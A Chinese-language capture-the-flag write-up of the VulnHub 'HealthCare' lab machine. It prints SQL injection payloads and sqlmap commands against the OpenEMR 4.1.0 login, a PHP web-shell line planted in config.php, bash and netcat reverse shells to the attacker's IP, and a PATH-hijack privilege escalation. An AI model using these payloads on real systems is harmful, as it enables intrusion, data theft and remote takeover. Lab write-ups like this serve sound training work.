# HealthCare

- victim
  - 192.168.159.131
- local
  - 192.168.159.6

题解：https://medium.com/@Shubham_Singh_/healthcare-1-walkthrough-vulnhub-24d9d050dd9c

---

## 扫描结果分析

就一个21和80，感觉都有嫌疑，21不允许匿名登录，但可以看看版本EXP，80 Web服务内容较多

简单看了下`ProFTPD`的EXP，还不少呢

## FTP服务分析

虽然`ProFTPD` EXP不少，但当前版本没有现成可用EXP，看看Web吧还是

## Web服务分析

robots.txt里内容不少，但基本上全是没用的，上`nikto`

```
nikto -host=http://192.168.159.131/
```

很快就提示shellshock可用了

```
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
```

可以根据`/usr/share/nmap/scripts/http-shellshock.nse`，利用burpsuite构造出payload

现成EXP：https://www.exploit-db.com/raw/34900

然而实测不行，扫一扫目录，用`gobuster`

找到入口`http://192.168.159.131/openemr`

获取到系统的版本`OpenEMR v4.1.0`

找到EXP：`https://www.exploit-db.com/exploits/17998`

文档：`https://www.open-emr.org/wiki/index.php/OpenEMR_4.1_Users_Guide`

根据文档，默认账号信息如下

```
admin
pass
```

登录失败

### SQL Injection —— Manual

PoC给的注入点需要登录才行，用登录部分的注入点也可以，简单看一下发现就是mysql，可以布尔注入也可以报错注入，老样子，记得URL编码

注入点

```
GET /openemr/interface/login/validateUser.php?u=
```

Payload(获取数据库)

```
' or updatexml(1,concat(0x7e,database(),0x7e),1) #
```

Payload(获取表名)

```
select group_concat(table_name) from information_schema.tables where table_schema=database() 

' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() ),0x7e),1) #

' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),30,30),0x7e),1) #

' or updatexml(1,concat(0x7e,(select substr(group_concat(table_name),90,30) from information_schema.tables where table_schema=database()),0x7e),1) #
```

```
addresses,amc_misc_data,ar_activity,ar_session,array,audit_details,audit_master,auto_notification,batchcom,billing
```

看起来挺长的，写脚本吧

获取数据表的脚本见`getTables.py`

数据表很长

发现有一个重要问题,`group_concat`是有长度限制的，默认1024，代码调整需要调整，每个表名先取第一个字符，然后拼接即可，太麻烦先不写了，反正不是考试直接SQLMAP

```
' or updatexml(1,concat(0x7e,(select substr(concat(substr(table_name,1,1)),{},30) from information_schema.tables where table_schema=database()),0x7e),1) #
```

### SQL Injection —— Sqlmap

```bash
sqlmap -u http://192.168.159.131/openemr/interface/login/validateUser.php?u= --dbs
```

```
[*] information_schema
[*] openemr
[*] test
```

```bash
sqlmap -u http://192.168.159.131/openemr/interface/login/validateUser.php?u=  -D openemr --tables
```

结果在`sqltables.txt`

```bash
sqlmap -u http://192.168.159.131/openemr/interface/login/validateUser.php?u=  -D openemr -T users --dump
# 并使用rockyou爆破
```

结果在`sqldata.txt`

主要信息

```
admin:ackbar
medical:medical
```

成功登录admin

## GetShell

在http://192.168.159.131/openemr/interface/main/main_screen.php?auth=login&site=default可以直接编辑php文件，写入php后门

```
http://192.168.159.131/openemr/sites/default/config.php
```

```php
system($_GET['hack']);
```

系统有点奇特，不支持ls，支持dir，uname结果如下，容易误认为是Windows

```
Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
```
载荷
```bash
bash -i >& /dev/tcp/192.168.159.6/4444 0>&1
```

```
view-source:http://192.168.159.131/openemr/sites/default/config.php?hack=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E159%2E6%2F4444%200%3E%261
```

读取到user.txt

```
d41d8cd98f00b204e9800998ecf8427e
```

优化shell

```bash
python -c 'import os; os.system("/bin/sh")'
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Priviledge Escalation

LinEnum检查后，喜讯如下，还有一个man命令的SGID权限，先不管了

```
[+] We can connect to the local MYSQL service as 'root' and without a password!
mysqladmin  Ver 8.42 Distrib 5.1.55, for mandriva-linux-gnu on i586
Copyright 2000-2008 MySQL AB, 2008 Sun Microsystems, Inc.
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL license

Server version          5.1.55
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/lib/mysql/mysql.sock
Uptime:                 17 min 34 sec

Threads: 6  Questions: 2681  Slow queries: 0  Opens: 45  Flush tables: 1  Open tables: 38  Queries per second avg: 2.543
```

可以以mysql管理员身份进入mysql，那我们利用mysql管理员权限读写文件

```mysql
select load_file("/etc/passwd");
select 'aaa' into outfile '/tmp/aaa';
```

发现mysql管理员的权限也就是mysql，我们看到home目录里mysql用户的持有人是root，那看看家目录，好吧，没啥东西，没思路了，再看看LinEnum的结果

必须仔细找，找到如下

```
[-] SGID files:
-rwxr-sr-x 1 root shadow 5176 Jan  9  2010 /usr/lib/chkpwd/tcb_chkpwd
-rwxr-sr-x 1 root polkituser 14076 Apr  5  2010 /usr/lib/polkit-grant-helper
-rwxr-sr-x 1 root polkituser 14468 Apr  5  2010 /usr/lib/polkit-explicit-grant-helper
-rwx--s--x 1 root utmp 10528 Jul 13  2011 /usr/lib/vte/gnome-pty-helper
-rwxr-sr-x 1 root mail 9416 Jul 13  2011 /usr/lib/camel-lock-helper-1.2
-rwxr-sr-x 1 root polkituser 8920 Apr  5  2010 /usr/lib/polkit-read-auth-helper
-rwxr-sr-x 1 root polkituser 15984 Apr  5  2010 /usr/lib/polkit-revoke-helper
-rwxr-sr-x 1 root utmp 5916 Jan 17  2010 /usr/sbin/utempter
-r-xr-sr-x 1 root tty 9636 Jan  9  2010 /usr/bin/wall
-rwsr-sr-x 1 root root 39020 Jun 26  2011 /usr/bin/crontab
-rwxr-sr-x 1 root tty 8396 Nov 16  2010 /usr/bin/write
-rwsr-sr-x 1 daemon daemon 41036 Jan 19  2010 /usr/bin/at
-rwsr-sr-x 1 daemon daemon 137 Jan 19  2010 /usr/bin/batch
-rwxr-sr-x 1 root chkpwd 2885732 May 17  2011 /usr/bin/xlock
-rwx--s--x 1 root shadow 65156 Jan  9  2010 /usr/bin/chage
-rwsr-sr-x 1 root root 5813 Jul 29 10:04 /usr/bin/healthcheck
-rwx--s--x 1 root slocate 31608 Nov 17  2009 /usr/bin/locate
-rwxr-sr-x 1 root man 43160 Jan 17  2011 /usr/bin/man
-rwxr-sr-x 1 root root 3736 Aug  2  2011 /sbin/netreport
```

`/usr/bin/healthcheck`显然不是自带的，一个特殊的SGID文件，但是LinEnum没能提示，我们将其利用

将程序拿下来，进行逆向或strings分析处理

发现其调用系统命令，并且会先移动到`/tmp`目录，可利用Path注入

```bash
cd /tmp
echo '#! /bin/bash' > ifconfig
echo '/usr/bin/nc 192.168.159.6 4445 -e /bin/bash' >> ifconfig
chmod 777 ifconfig
export PATH=/tmp
```

执行

```bash
/usr/bin/healthcheck
```

得到新shell，修复PATH

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
得到root.txt
```
eaff25eaa9ffc8b62e3dfebf70e83a7b
```

